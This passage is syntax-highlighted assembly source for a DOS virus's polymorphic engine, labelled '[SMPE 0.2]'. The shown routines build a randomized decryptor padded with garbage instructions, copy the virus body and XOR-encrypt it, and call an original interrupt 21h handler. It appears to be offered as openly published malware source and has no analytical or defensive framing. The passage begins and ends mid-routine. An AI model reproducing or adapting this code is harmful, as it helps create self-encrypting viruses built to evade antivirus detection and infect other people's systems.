        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0374h</span><span class="sc0">                        </span><span class="sc1">; JZ=JE away</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">can_doda</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_stojz</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">ok_stojz</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">; put JBE</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">ok_stojz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">                         </span><span class="sc1">; JMP</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">end_bjump</span><span class="sc0">

</span><span class="sc5">do_short_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">049h</span><span class="sc0">         </span><span class="sc1">; is a DEC CX ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">normal_short_jump</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">normal_short_jump</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                              </span><span class="sc1">; overwrite the dec cx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">; jump bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc0">                         </span><span class="sc1">; LOOP</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">xchnstr</span><span class="sc0">

</span><span class="sc5">normal_short_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc0">                          </span><span class="sc1">; JNE=JNZ back</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">can_doda</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">xchnstr</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">xchnstr</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">xchnstr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">end_bjump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ds_mody</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">; we can again change DS</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; we can now use all regs</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">                      </span><span class="sc1">; put some more garbage</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inverse</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_more_needed</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">                      </span><span class="sc1">; expecially if we encrypted</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">                      </span><span class="sc1">; from end to begin - prefetch</span><span class="sc0">

</span><span class="sc5">no_more_needed</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_di</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; calculate pointer on code</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inverse</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">lets_cont</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_lenght</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">lets_cont</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; store pointer on code</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc1">;; Decryptor building end</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_lenght</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isword</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; convert lenght in words</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">go_for_it</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">go_for_it</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">             </span><span class="sc1">; store lenght</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc1">; Copy code and encrypt it</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                             </span><span class="sc1">; copy the virus after</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_normal_encrypt_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">crypt_size</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">enc_dec_smpe</span><span class="sc0">                     </span><span class="sc1">; encrypt with the xor</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inverse</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_decrement_ndd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">first_inc</span><span class="sc4">],</span><span class="sc2">4eh</span><span class="sc0">     </span><span class="sc1">; dec si</span><span class="sc0">
</span><span class="sc5">no_decrement_ndd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isrolror</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; are we rol(r)ling?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">noro</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_loop</span><span class="sc4">],</span><span class="sc2">0d2h</span><span class="sc0">       </span><span class="sc1">; first byte for ror/rol</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">random_value</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">  </span><span class="sc1">; no random value req</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isrolror</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">

</span><span class="sc5">noro</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isword</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; word operations?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pre_enc_loop_one</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; calculate lenght in words</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_loop</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; put word working opcode</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inverse</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ok_no_cl_ch</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">ok_no_cl_ch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">second_inc</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">   </span><span class="sc1">; put another inc</span><span class="sc0">
</span><span class="sc5">pre_enc_loop_one</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b1h</span><span class="sc0">                    </span><span class="sc1">; mov cl,</span><span class="sc0">
</span><span class="sc5">cl_move</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">                     </span><span class="sc1">; immediate</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; DS to what we must encrypt</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">enc_loop</span><span class="sc0">                </span><span class="sc1">; cpus rules 4 prefetch</span><span class="sc0">

</span><span class="sc5">do_inc_pointer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomshit</span><span class="sc0">              </span><span class="sc1">; some foo instructions</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">                 </span><span class="sc1">; pointer increment</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inverse</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_decrement</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                  </span><span class="sc1">; dec base</span><span class="sc0">
</span><span class="sc5">no_decrement</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">point_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">randomshit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">                       </span><span class="sc1">; how much shit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">randomshit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_the_random</span><span class="sc0">                   </span><span class="sc1">; do shit</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">enc_loop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;        xor     byte ptr ds:[si],immediate</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">080h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">034h</span><span class="sc0">            </span><span class="sc1">; real poly encryption</span><span class="sc0">
</span><span class="sc5">random_value</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">; random value2</span><span class="sc0">

</span><span class="sc5">first_inc</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">46h</span><span class="sc0">             </span><span class="sc1">; inc si</span><span class="sc0">
</span><span class="sc5">second_inc</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">; space for second inc si</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">enc_loop</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">inverse</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">; from end?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">normali</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">; adjust lenght</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">after_it</span><span class="sc0">
</span><span class="sc5">normali</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">after_it</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                           </span><span class="sc1">; ds:dx = generated code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                           </span><span class="sc1">; cx=di=lenght</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">add_to_cx</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">                 </span><span class="sc1">; deallocate the mem for poly</span><span class="sc0">
                                                </span><span class="sc1">; ES still on virus code,</span><span class="sc0">
                                                </span><span class="sc1">; but now it isn't allocated</span><span class="sc0">
                                                </span><span class="sc1">; any more</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">enc_dec_smpe_engine</span><span class="sc0">             </span><span class="sc1">; encrypt poly and exit</span><span class="sc0">

</span><span class="sc5">poly_name</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'[SMPE 0.2]'</span><span class="sc0">

</span><span class="sc5">add_to_cx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0111111b</span><span class="sc0">                     </span><span class="sc1">; add up to 63 bytes to</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">; the lenght in CX</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_garbage</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                  </span><span class="sc1">; max number of garbage i.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">pung</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">       </span><span class="sc1">; how much instructions</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pung</span><span class="sc0">            </span><span class="sc1">; no 0 instruction allowed!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">           </span><span class="sc1">; CX = number of instructions to generate</span><span class="sc0">

</span><span class="sc5">do_the_random</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">                           </span><span class="sc1">; used for the random gen</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                          </span><span class="sc1">; no SP allowed</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_the_random</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; don't change the counter</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_the_random</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">point_reg</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; don't change the pointer</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_the_random</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nocx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; no CX change if used</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_the_random</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">reg8bits</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; reset 8 bit marker</span><span class="sc0">
